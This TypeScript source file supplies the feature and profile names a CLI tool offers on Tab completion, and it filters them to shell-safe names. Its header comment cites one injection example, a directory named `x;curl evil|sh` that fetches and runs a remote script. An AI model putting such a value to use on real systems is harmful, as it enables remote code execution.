/**
 * Completion value sources — the names a Tab press may offer.
 *
 * Every name returned here is inserted into the user's command line as shell
 * text, and a cloned repo controls both the feature directories and the project
 * profile files. Each list is therefore filtered to shell-inert names before it
 * is returned: a directory called `x;curl evil|sh` can exist, but it is never
 * offered as a candidate.
 *
 * Both functions are read-only name sources: nothing here loads a profile's
 * contents or a feature's PRD.
 */

import { type Dirent, readdirSync } from "node:fs";
import { dirname } from "node:path";
import { featuresDir, findProjectDir, listProfiles } from "@/config";
import { validateFeatureName } from "@/utils/feature-name";

/** A profile name safe to insert as shell text. Same charset the rest of nax uses. */
const SAFE_PROFILE_NAME = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;

/**
 * The project root enclosing `startDir`, or null when `startDir` is outside any
 * nax project. `findProjectDir` returns the nearest `.nax` directory holding a
 * project config, so the root is its parent.
 */
function projectRootFor(startDir: string): string | null {
  const naxDir = findProjectDir(startDir);
  return naxDir === null ? null : dirname(naxDir);
}

/** True when `validateFeatureName` would accept `name` — i.e. `nax run`/`nax plan` would. */
function isFeatureName(name: string): boolean {
  try {
    validateFeatureName(name);
    return true;
  } catch {
    // An unusable name is a candidate to omit, not a reason to fail the Tab.
    return false;
  }
}

/** Directory entries of `dir`, or null when it cannot be read (missing, or not a directory). */
function readEntries(dir: string): Dirent[] | null {
  try {
    return readdirSync(dir, { withFileTypes: true });
  } catch {
    // No features directory yet (a fresh project) — no candidates, no error.
    return null;
  }
}

/**
 * Names of the directories under `featuresDir(<project root found from startDir>)`.
 *
 * Every directory counts, not only those holding a `prd.json` (as
 * `features resolve` requires): `nax plan -f <name>` names a feature before it
 * has one. Dot-directories and any name `validateFeatureName` rejects are
 * excluded, and the result is de-duplicated and sorted.
 */
export async function listFeatureNames(startDir: string): Promise<string[]> {
  const projectRoot = projectRootFor(startDir);
  if (projectRoot === null) return [];

  const entries = readEntries(featuresDir(projectRoot));
  if (entries === null) return [];

  const names = entries.filter((entry) => entry.isDirectory() && isFeatureName(entry.name)).map((entry) => entry.name);
  return [...new Set(names)].sort();
}

/**
 * De-duplicated names from `listProfiles(<project root found from startDir, else startDir>)`.
 *
 * Outside a project `startDir` is passed through, so only global profiles are
 * found. Names are filtered to the shell-inert charset above before being
 * offered.
 */
export async function listProfileNames(startDir: string): Promise<string[]> {
  const projectRoot = projectRootFor(startDir) ?? startDir;
  const entries = await listProfiles(projectRoot);
  const names = entries.map((entry) => entry.name).filter((name) => SAFE_PROFILE_NAME.test(name));
  return [...new Set(names)].sort();
}
